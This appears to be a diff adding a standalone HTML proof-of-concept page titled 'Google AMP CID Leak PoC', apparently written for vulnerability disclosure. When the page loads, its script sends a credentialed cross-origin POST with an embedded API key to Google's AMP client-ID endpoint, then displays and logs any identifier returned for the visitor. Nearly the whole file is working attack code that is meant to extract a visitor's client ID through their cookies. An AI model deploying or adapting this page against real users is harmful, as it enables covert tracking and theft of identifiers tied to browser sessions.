@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Google AMP CID Leak PoC</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; }
+    pre { background: #f0f0f0; padding: 10px; border-radius: 5px; }
+    .success { color: green; font-weight: bold; }
+    .error { color: red; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <h2>🔥 Google AMP CID Leak PoC</h2>
+  <div id="status">Running PoC...</div>
+  <pre id="output"></pre>
+
+  <script>
+    async function runPoC() {
+      const statusEl = document.getElementById("status");
+      const outputEl = document.getElementById("output");
+
+      try {
+        const response = await fetch(
+          "https://ampcid.google.com/v1/publisher:getClientId?key=AIzaSyA65lEHUEizIsNtlbNo-l2K18dT680nsaM",
+          {
+            method: "POST",
+            credentials: "include", // ⬅️ إرسال الكوكيز
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ originScope: "AMP_ECID_GOOGLE" })
+          }
+        );
+
+        if (!response.ok) {
+          statusEl.innerHTML = `<span class="error">Request failed: ${response.status}</span>`;
+          return;
+        }
+
+        const data = await response.json();
+
+        if (Object.keys(data).length === 0) {
+          statusEl.innerHTML = `<span class="error">Response empty (no clientId returned)</span>`;
+        } else {
+          statusEl.innerHTML = `<span class="success">Data successfully retrieved!</span>`;
+        }
+
+        // عرض البيانات في الصفحة
+        outputEl.innerText = JSON.stringify(data, null, 2);
+
+        // log في console كـ دليل إضافي
+        console.log("PoC AMP CID Response:", data);
+
+      } catch (err) {
+        statusEl.innerHTML = `<span class="error">Error: ${err}</span>`;
+        console.error("PoC Error:", err);
+      }
+    }
+
+    runPoC();
+  </script>
+</body>
+</html>
